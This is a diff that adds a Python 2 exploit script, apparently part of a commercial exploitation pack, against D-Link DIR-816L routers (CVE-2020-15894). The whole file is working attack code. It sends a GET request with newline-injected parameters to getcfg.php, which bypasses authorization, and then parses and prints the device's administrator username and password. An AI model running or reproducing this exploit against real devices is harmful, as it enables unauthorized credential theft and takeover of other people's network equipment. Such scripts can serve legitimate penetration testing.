@@ -1,0 +1,50 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_dlink_34'
+_vendor_ = 'dlink'
+_model_  = ['DIR-816L']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2020-15894'
+_ref_    = 'https://research.loginsoft.com/vulnerability/multiple-vulnerabilities-discovered-in-the-d-link-firmware-dir-816l/'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/getcfg.php?a=%%0a_POST_SERVICES%%3DDEVICE.ACCOUNT%%0aAUTHORIZED_GROUP%%3D1" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "DEVICE.ACCOUNT" in response.text:
+    user = ""
+    password = ""
+    print '[+] %s vulnerable' % host
+    m = re.search("<name>([^<]+)</name>", response.text)
+    if m:
+        user = m.group(1)
+    m = re.search("<password>([^<]+)</password>", response.text, re.DOTALL)
+    if m:
+        password = m.group(1)
+    print('User: %s\nPassword: %s\n\n===\n\n'%(user,password))               
+    print(response.text)
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
